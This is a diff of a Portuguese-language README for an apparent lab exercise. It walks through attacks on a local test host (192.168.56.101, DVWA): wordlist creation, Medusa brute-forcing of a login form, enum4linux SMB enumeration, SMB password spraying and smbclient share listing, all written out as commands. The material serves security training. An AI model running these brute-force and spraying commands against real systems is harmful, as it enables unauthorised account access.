@@ -41,14 +41,18 @@ Todos os testes foram realizados em ambiente controlado e exclusivamente para fi
 🚀 Simulação Prática de Ataques
 
 📌 Exercício 1 – Criação de Wordlists
+
 Criação de listas de usuários e senhas para uso em ataques automatizados.
+
 ➡️ 192.168.56.101 
 ➡️ echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
 ➡️ echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
  
 📌 Exercício 2 – Ataque HTTP com Medusa
+
 Ferramenta utilizada: Medusa
 Objetivo: realizar ataque de força bruta contra formulário de login (DVWA).
+
 ➡️ medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
 ➡️ -m PAGE:'/dvwa/login.php' \
 ➡️ -m FORM:'username=^USER^password=^PASS^Login=Login' \
@@ -58,18 +62,21 @@ Objetivo: realizar ataque de força bruta contra formulário de login (DVWA).
 
 Ferramenta utilizada: Enum4linux
 Objetivo: coletar informações sobre usuários e compartilhamentos via SMB.
+
 ➡️ enum4linux -a 192.168.56.101 | tee enum4_output.txt
 ➡️ less enum4_output.txt
  
 📌 Exercício 4 – Password Spraying via SMB
 
 Ferramenta utilizada: Medusa
+
 ➡️ echo -e "user\nmsfadmin\nservice" > smb_users.txt
 ➡️ medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
 
 📌 Exercício 5 – Enumeração de Compartilhamentos
 
 Ferramenta utilizada: SMBClient
+
 ➡️ smbclient -L //192.168.56.101 -U msfadmin
 
 🖼️ Evidências
